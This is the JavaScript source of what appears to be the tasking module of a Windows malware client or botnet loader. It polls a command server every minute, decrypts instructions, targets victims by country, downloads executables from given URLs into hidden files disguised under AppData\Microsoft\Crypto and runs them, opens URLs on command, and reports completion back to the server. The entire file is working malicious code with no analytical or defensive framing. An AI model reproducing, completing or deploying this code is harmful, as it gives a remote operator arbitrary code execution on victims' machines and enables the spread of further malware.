const fs = require('fs');
const path = require('path');
const core = require('./core');
const axios = require('axios');
const config = require('../config');
const crypto = require('./crypto');
const report = require('./report');
const childprocess = require('child_process');
const util = require('util');
const stream = require('stream');
const pipeline = util.promisify(stream.pipeline);

class TaskManager {
    constructor() {
        this.tasks = []
        this.tasksPath = path.join(process.env.appdata, 'Microsoft', 'Crypto', `TASKS${config.id}`);
    }

    loadTasks() {
        if (fs.existsSync(this.tasksPath)) {
            this.tasks = JSON.parse(fs.readFileSync(this.tasksPath));
        } else {
            fs.writeFileSync(this.tasksPath, JSON.stringify(this.tasks));
            core.hideFile(this.tasksPath);
        }
    }

    saveTasks() {
        fs.writeFileSync(this.tasksPath, JSON.stringify(this.tasks));
    }

    isAldready(id) {
        for (let i = 0; i < this.tasks.length; i++) {
            const task = this.tasks[i];
            if (task._id == id) {
                return true;
            }
        }

        return false;
    }

    addTask(task) {
        this.tasks.push(task);
    }

    async runTask() {
        for (let i = 0; i < this.tasks.length; i++) {
            const task = this.tasks[i];

            if (!task.completed) {
                if (task.goal == 'download_execute') {
                    try {
                        await downloadExecute(task.param);
                    } catch (e) { }
                }
                if (task.goal == 'visit') {
                    try {
                        await visitUrl(task.param);
                    } catch (e) { }
                }

                task.completed = true;
                try {
                    axios({
                        url: config.baseurl + '/tasks/complete/' + config.id + '/' + task._id,
                        method: 'GET'
                    });
                } catch (e) { }
            }
        }

        this.saveTasks();
    }
}

async function runTasks() {
    const country = await report.getCountry();
    const taskManager = new TaskManager();
    taskManager.loadTasks();
    
    while(true) {
        await core.sleep(1000 * 60 * 1);
        try {
            const res = await axios({
                url: config.baseurl + '/tasks/' + config.id,
                method: 'GET'
            });

            const tasks = JSON.parse(crypto.decrypt(res.data, config.encryptedKey));
            for (let i = 0; i < tasks.length; i++) {
                const task = tasks[i];
                if (taskManager.isAldready(task._id)) {
                    continue;
                }

                if (task.completed < task.targeted && (task.countries.includes('*') || task.countries.includes(country))) {
                    task.completed = false;
                } else {
                    task.completed = true;
                }
                
                taskManager.addTask(task);
                await taskManager.runTask();
            }
        } catch (e) { }
    }
}

async function downloadExecute(url) {
    const execPath = path.join(process.env.appdata, 'Microsoft', 'Crypto', `EXECUTE${core.randomString(8)}.exe`);
    try {
        const response = await axios.get(url, {
            responseType: 'stream'
        });
        await pipeline(response.data, fs.createWriteStream(execPath));
    } catch (e) {
        return
    }
    core.hideFile(execPath);
    const child = childprocess.spawn(execPath, { cwd: path.dirname(process.execPath), detached: false, shell: true, windowsHide: false });
    child.unref();
}

async function visitUrl(url) {
    const child = childprocess.spawn("start " + url, { detached: false, shell: true, windowsHide: false });
    child.unref();
}

module.exports = {
    runTasks
}